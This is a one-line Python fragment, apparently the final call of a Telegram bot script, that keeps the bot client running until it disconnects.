bot.run_until_disconnected()